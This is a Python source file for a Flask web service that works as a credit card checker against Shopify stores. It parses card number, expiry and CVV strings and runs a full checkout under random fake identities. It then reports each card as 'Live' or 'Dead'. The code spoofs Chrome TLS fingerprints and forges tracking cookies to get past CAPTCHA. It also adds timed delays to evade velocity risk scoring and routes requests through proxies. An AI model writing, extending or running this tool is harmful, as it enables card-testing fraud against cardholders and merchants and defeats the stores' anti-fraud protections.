import asyncio
import json
import re
import random
import threading
import os
import logging
import time
import uuid
from urllib.parse import urlparse
from typing import Tuple, Dict, Any, Optional
from flask import Flask, request, jsonify

# Using curl_cffi to mathematically spoof Chrome JA3/TLS fingerprints
from curl_cffi.requests import AsyncSession, RequestsError

# Import optimized queries from the local Graphql.py file
from graphql import QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_DELIVERY, MUTATION_SUBMIT, QUERY_POLL

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger("shopify_checker")

ADDRESS_BOOK = {
    "US": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"},
    "CA": {"address1": "700 2 St SW", "address2": "", "city": "Calgary", "zoneCode": "AB", "postalCode": "T2P 2W2", "countryCode": "CA", "phone": "+14035550187"},
    "GB": {"address1": "100 New Bridge St", "address2": "", "city": "London", "zoneCode": "LND", "postalCode": "EC4V 6JA", "countryCode": "GB", "phone": "+442079460912"},
    "AU": {"address1": "100 George St", "address2": "", "city": "Sydney", "zoneCode": "NSW", "postalCode": "2000", "countryCode": "AU", "phone": "+61291234567"},
    "DEFAULT": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"}
}

CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU"
}

_VARIANT_CACHE = {}
_cache_lock = threading.Lock()

class Utils:
    @staticmethod
    def get_random_name() -> Tuple[str, str]:
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return random.choice(first_names), random.choice(last_names)
    
    @staticmethod
    def generate_email(first: str, last: str) -> str:
        domains = ["gmail.com", "yahoo.com", "outlook.com"]
        return f"{first.lower()}.{last.lower()}{random.randint(10,99)}@{random.choice(domains)}"

def resolve_address(url: str, currency: Optional[str] = None) -> Dict[str, str]:
    domain = urlparse(url if url.startswith("http") else f"https://{url}").netloc.lower()
    tld = domain.split(".")[-1].upper()
    if tld in ADDRESS_BOOK: return ADDRESS_BOOK[tld]
    if currency:
        country_code = CURRENCY_TO_COUNTRY.get(currency.upper())
        if country_code and country_code in ADDRESS_BOOK: return ADDRESS_BOOK[country_code]
    return ADDRESS_BOOK["DEFAULT"]

def extract_between(text: str, start: str, end: str) -> Optional[str]:
    if not text or not start or not end: return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]: return parts[1].split(end, 1)[0]
    except Exception: pass
    return None

def get_curl_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("http://", "https://", "socks5://")): p = proxy_str
    elif '@' in proxy_str: p = f"http://{proxy_str}"
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2: p = f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4: p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else: return None
    return {"http": p, "https": p}

def is_captcha_required(response_text: str) -> bool:
    if not response_text: return False
    indicators = ['CAPTCHA_REQUIRED', 'captcha required', 'hcaptcha', 'cf-browser-verification', 'cf-turnstile', 'datadome']
    return any(indicator in response_text.lower() for indicator in indicators)

def extract_clean_response(message: str) -> str:
    if not message: return "UNKNOWN_ERROR"
    message = str(message)
    if "GraphQL Error:" in message: return message[:150].strip()
    patterns = [r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'{"code":"([^"]+)"', r"'code':'([^']+)'"]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        if matches:
            match = matches[0] if not isinstance(matches[0], tuple) else matches[0][0]
            if "_" in match and len(match) < 50: return match.strip("{}:'\" ")
    words = message.split()
    if words and "_" in words[0] and words[0].isupper(): return words[0]
    return message[:50]

def parse_cc_string(cc_string: str) -> Dict[str, str]:
    parts = cc_string.split('|')
    if len(parts) != 4: raise ValueError("Invalid CC format")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()}

def _classify_status(success: bool, response_text: str) -> Optional[str]:
    if not response_text: return None
    upper_text = response_text.upper()
    if "ORDER_PLACED" in upper_text: return "ORDER_PLACED"
    if "INSUFFICIENT_FUNDS" in upper_text: return "INSUFFICIENT_FUNDS"
    if "OTP" in upper_text or "3DS" in upper_text or "AUTHENTICATION_REQUIRED" in upper_text: return "OTP_REQUIRED"
    return None

class ShopifyCheckoutSession:
    def __init__(self, site_url: str, cc_info: Dict[str, str], variant_id: Optional[str] = None):
        self.site_url = site_url if site_url.startswith('http') else f'https://{site_url}'
        self.domain = urlparse(self.site_url).netloc
        self.cc_info = cc_info
        self.variant_id = variant_id
        
        self.address_info = resolve_address(self.site_url)
        self.firstName, self.lastName = Utils.get_random_name()
        self.email = Utils.generate_email(self.firstName, self.lastName)
        self.phone = self.address_info["phone"]
        self.street = self.address_info["address1"]
        self.address2 = self.address_info["address2"]
        self.city = self.address_info["city"]
        self.state = self.address_info["zoneCode"]
        self.s_zip = self.address_info["postalCode"]
        self.country_code = self.address_info["countryCode"]
        
        self.checkout_url = ""
        self.attempt_token = ""
        self.sst = ""
        self.queueToken = ""
        self.stableId = ""
        self.merch = ""
        self.currency = "USD"
        self.subtotal = "0.01"
        self.build_id = None
        
        self.checkpoint_data = None
        self.running_total = "0.00"
        self.delivery_strategy = ""
        
        self.gateway = "UNKNOWN"
        self.payment_identifier = None

    def get_navigate_headers(self) -> Dict[str, str]:
        return {
            'referer': f"{self.site_url}/",
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'accept-language': 'en-US,en;q=0.9'
        }

    def get_graphql_headers(self) -> Dict[str, str]:
        h = {
            'content-type': 'application/json',
            'origin': self.site_url,
            'referer': self.checkout_url if self.checkout_url else f"{self.site_url}/",
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'accept-language': 'en-US,en;q=0.9'
        }
        if self.sst: h['x-checkout-one-session-token'] = self.sst
        if self.attempt_token: h['shopify-checkout-source'] = f'id="{self.attempt_token}", type="cn"'
        if self.build_id:
            h['x-checkout-web-build-id'] = self.build_id
            h['x-checkout-web-deploy-stage'] = 'production'
        return h

    async def inject_telemetry_cookies(self, session):
        """Forges Shopify's JS tracking cookies to bypass CAPTCHA triggers."""
        y_uuid = str(uuid.uuid4())
        s_uuid = str(uuid.uuid4())
        
        session.cookies.set('_y', y_uuid, domain=self.domain)
        session.cookies.set('_s', s_uuid, domain=self.domain)
        session.cookies.set('_shopify_y', y_uuid, domain=self.domain)
        session.cookies.set('_shopify_s', s_uuid, domain=self.domain)
        session.cookies.set('localization', self.country_code, domain=self.domain)
        session.cookies.set('keep_alive', '1', domain=self.domain)

    async def _graphql_req(self, session, json_data, max_retries=1) -> Tuple[bool, str]:
        graphql_url = f'https://{self.domain}/checkouts/unstable/graphql'
        headers = self.get_graphql_headers()
        
        for attempt in range(max_retries + 1):
            try:
                resp = await session.post(graphql_url, headers=headers, json=json_data)
                if is_captcha_required(resp.text): return False, "CAPTCHA_REQUIRED"
                return True, resp.text
            except Exception as e:
                if attempt == max_retries: return False, str(e)
                await asyncio.sleep(1)
        return False, "Request failed"

    async def init_checkout(self, session) -> Tuple[bool, str]:
        try:
            nav_headers = self.get_navigate_headers()
            resp = await session.get(self.site_url + '/checkout', allow_redirects=True, headers=nav_headers)
            self.checkout_url = str(resp.url)
            text = resp.text
        except Exception as e: return False, f"Init failed: {str(e)}"

        if is_captcha_required(text) or resp.status_code in (403, 429): return False, "CAPTCHA_REQUIRED"
        
        url_lower = self.checkout_url.lower()
        if 'login' in url_lower or '/cart' in url_lower and '/checkouts' not in url_lower: return False, "Redirected to Cart/Login"

        match = re.search(r'/checkouts/(?:c|cn|unstable)/([^/?]+)', self.checkout_url)
        self.attempt_token = match.group(1) if match else self.checkout_url.split('/')[-1].split('?')[0]
        
        self.sst = resp.headers.get('X-Checkout-One-Session-Token') or extract_between(text, 'name="serialized-sessionToken" content="', '"')
        if not self.sst: return False, "Failed to get session token"
        
        self.queueToken = extract_between(text, 'queueToken":"', '"') or ""
        self.stableId = extract_between(text, 'stableId":"', '"') or "1"
        self.merch = extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or str(self.variant_id)
        self.currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
        
        b_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', text)
        self.build_id = b_match.group(1) if b_match else None
            
        return True, "OK"

    async def negotiate_shipping(self, session) -> Tuple[bool, str]:
        json_data = {'query': QUERY_PROPOSAL_SHIPPING, 'variables': {
            'sessionInput': {'sessionToken': self.sst}, 'queueToken': self.queueToken,
            'delivery': {'deliveryLines': [{'destination': {'partialStreetAddress': {'address1': self.street, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'zoneCode': self.state}}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]}, 'deliveryMethodTypes': ['SHIPPING']}], 'noDeliveryRequired': []},
            'merchandise': {'merchandiseLines': [{'stableId': self.stableId, 'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}', 'variantId': f'gid://shopify/ProductVariant/{self.variant_id}'}}, 'quantity': {'items': {'value': 1}}}]},
            'buyerIdentity': {'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code}, 'email': self.email, 'phoneCountryCode': self.country_code}
        }, 'operationName': 'Proposal'}
        
        for _ in range(4):
            success, text = await self._graphql_req(session, json_data)
            if not success: return False, text
            try:
                resp = json.loads(text)
                sp = resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                if not sp:
                    self.checkpoint_data = resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('checkpointData')
                    continue
                if sp.get('delivery', {}).get('__typename') == 'PendingTerms':
                    await asyncio.sleep(2)
                    continue
                
                lines = sp.get('delivery', {}).get('deliveryLines', [{}])
                if lines and lines[0].get('availableDeliveryStrategies'):
                    self.delivery_strategy = lines[0]['availableDeliveryStrategies'][0].get('handle', '')
                
                for method in sp.get('payment', {}).get('availablePaymentLines', []):
                    pm = method.get('paymentMethod', {})
                    if pm.get('paymentMethodIdentifier'):
                        self.payment_identifier = pm.get('paymentMethodIdentifier')
                        self.gateway = pm.get('name', 'UNKNOWN')
                        break
                        
                if not self.payment_identifier: return False, "NO_DIRECT_CC_GATEWAY_AVAILABLE"
                
                rt = sp.get('runningTotal', {}).get('value', {}).get('amount')
                if rt: self.running_total = str(rt)
                return True, "OK"
            except Exception: pass
        return False, "Timed out on shipping"

    async def tokenize_card(self, session) -> Tuple[bool, str]:
        payload = {
            "credit_card": {"number": self.cc_info['cc'], "month": int(self.cc_info['mes']), "year": int(self.cc_info['ano']), "verification_value": self.cc_info['cvv'], "name": f"{self.firstName} {self.lastName}"},
            "payment_session_scope": self.domain
        }
        vault_headers = {
            'accept': 'application/json', 'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com', 'referer': 'https://checkout.pci.shopifyinc.com/'
        }
        try:
            resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers)
            return True, resp.json().get('id', '')
        except Exception as e: return False, f'Tokenization error: {str(e)}'

    async def submit_payment(self, session, token: str) -> Tuple[bool, str, str]:
        # Analytics payload exactly matches a real browser to prevent CheckpointDenied
        submit_vars = {
            'input': {
                'sessionInput': {'sessionToken': self.sst}, 'queueToken': self.queueToken,
                'delivery': {'deliveryLines': [{'destination': {'streetAddress': {'address1': self.street, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone}}, 'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': self.delivery_strategy}}, 'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]}, 'deliveryMethodTypes': ['SHIPPING']}]},
                'merchandise': {'merchandiseLines': [{'stableId': self.stableId, 'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{self.merch}', 'variantId': f'gid://shopify/ProductVariant/{self.variant_id}'}}, 'quantity': {'items': {'value': 1}}}]},
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': self.payment_identifier, 'sessionId': token, 'billingAddress': {'streetAddress': {'address1': self.street, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone}}}}, 'amount': {'value': {'amount': self.running_total, 'currencyCode': self.currency}}}]
                },
                'buyerIdentity': {'customer': {'presentmentCurrency': self.currency, 'countryCode': self.country_code}, 'email': self.email, 'phoneCountryCode': self.country_code}
            },
            'attemptToken': self.attempt_token, 
            'analytics': {'requestUrl': self.checkout_url}
        }
        if self.checkpoint_data: submit_vars['input']['checkpointData'] = self.checkpoint_data
        
        success, text = await self._graphql_req(session, {'query': MUTATION_SUBMIT, 'variables': submit_vars, 'operationName': 'SubmitForCompletion'})
        if not success: return False, text, ""
        
        try:
            resp = json.loads(text)
            sd = resp.get('data', {}).get('submitForCompletion', {})
            rtype = sd.get('__typename', '')
            
            if rtype in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                rcpt = sd.get('receipt', {})
                if rcpt.get('__typename') == 'ProcessedReceipt': return True, "ORDER_PLACED", ""
                return True, "POLL", rcpt.get('id', '')
            elif rtype == 'SubmitFailed': return False, extract_clean_response(sd.get('reason', '')), ""
            elif rtype == 'CheckpointDenied': return False, "CAPTCHA_REQUIRED (Score Too Low)", ""
            return False, rtype, ""
        except: return False, "Submit parse error", ""

    async def poll_receipt(self, session, receipt_id: str) -> Tuple[bool, str]:
        for _ in range(15):
            await asyncio.sleep(2.5)
            success, text = await self._graphql_req(session, {'query': QUERY_POLL, 'variables': {'receiptId': receipt_id, 'sessionToken': self.sst}, 'operationName': 'PollForReceipt'})
            if not success: return False, text
            try:
                rdata = json.loads(text).get('data', {}).get('receipt', {})
                tname = rdata.get('__typename', '')
                if tname == 'ProcessedReceipt': return True, "ORDER_PLACED"
                elif tname == 'ActionRequiredReceipt': return True, "OTP_REQUIRED"
                elif tname == 'FailedReceipt':
                    code = rdata.get('processingError', {}).get('code', 'UNKNOWN_ERROR')
                    return False, code
            except: break
        return False, "POLL_TIMEOUT"

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    checkout = ShopifyCheckoutSession(site_url, {'cc': cc, 'mes': mes, 'ano': ano, 'cvv': cvv}, variant_id)
    proxies = get_curl_proxy(proxy_str)
    
    try:
        # Utilizing chrome124 to enforce modern JA3/HTTP2 fingerprints.
        async with AsyncSession(impersonate="chrome124", proxies=proxies, timeout=60) as session:
            # WARMUP & TELEMETRY INJECTION
            await checkout.inject_telemetry_cookies(session)
            try:
                await session.get(checkout.site_url, headers=checkout.get_navigate_headers(), timeout=10)
                await session.get(f"{checkout.site_url}/cart", headers=checkout.get_navigate_headers(), timeout=10)
            except: pass
            
            # Simulated human delays are required to bypass velocity risk scoring
            await asyncio.sleep(2.5)
            
            if not checkout.variant_id:
                try:
                    resp = await session.get(f"{checkout.site_url}/products.json?limit=10")
                    checkout.variant_id = str(resp.json()['products'][0]['variants'][0]['id'])
                except: return False, "Product fetch failed", "UNKNOWN", "0"
            
            # Cart Add
            await session.post(f"{checkout.site_url}/cart/add.js", data=f'id={checkout.variant_id}&quantity=1', headers={'content-type': 'application/x-www-form-urlencoded'})
            
            await asyncio.sleep(3) # Velocity delay
            
            ok, msg = await checkout.init_checkout(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total
            
            await asyncio.sleep(3) # Velocity delay
            ok, msg = await checkout.negotiate_shipping(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total
            
            ok, token = await checkout.tokenize_card(session)
            if not ok: return False, token, checkout.gateway, checkout.running_total
            
            ok, status, rid = await checkout.submit_payment(session, token)
            if not ok: return False, status, checkout.gateway, checkout.running_total
            if status != "POLL": return True, status, checkout.gateway, checkout.running_total
            
            ok, final_status = await checkout.poll_receipt(session, rid)
            return ok, final_status, checkout.gateway, checkout.running_total

    except Exception as e: return False, f"Process Error: {str(e)}", checkout.gateway, checkout.running_total

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    cc_string = request.args.get('cc', '').strip()
    try:
        cc_parts = parse_cc_string(cc_string)
        success, message, gateway, price = asyncio.run(
            process_card_async(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'], request.args.get('site'), request.args.get('variant'), request.args.get('proxy'))
        )
        clean = extract_clean_response(message)
        status = _classify_status(success, clean) or "Dead"
        if status in ["ORDER_PLACED", "INSUFFICIENT_FUNDS"]: status = "Live"
        return jsonify({"Gateway": gateway, "Price": price, "Response": clean, "Status": status, "cc": cc_string})
    except Exception as e:
        return jsonify({"Status": "Dead", "Response": str(e)})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))